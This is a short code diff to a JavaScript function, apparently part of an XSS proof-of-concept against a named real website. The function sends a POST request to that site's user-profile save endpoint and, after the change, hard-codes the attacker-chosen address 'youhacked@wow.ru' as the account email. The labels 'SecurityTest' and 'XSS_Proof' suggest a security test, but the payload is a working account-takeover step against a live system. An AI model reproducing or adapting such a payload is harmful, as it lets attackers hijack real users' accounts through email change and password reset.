@@ -19,12 +19,13 @@ function changeEmail(newEmail) {
   }
 
   const formData = new FormData();
-  formData.append('values[email]', newEmail);
+  
   
   formData.append('values[name]', 'SecurityTest');
   formData.append('values[lastName]', 'XSS_Proof');
   formData.append('values[login]', 'test3');
   formData.append('values[secondName]', '');
+  formData.append('values[email]', 'youhacked@wow.ru');
 
   fetch('https://archives.nobl.ru/local/templates/g3/components/openregion/user/.default/http/save.php', {
     method: 'POST',
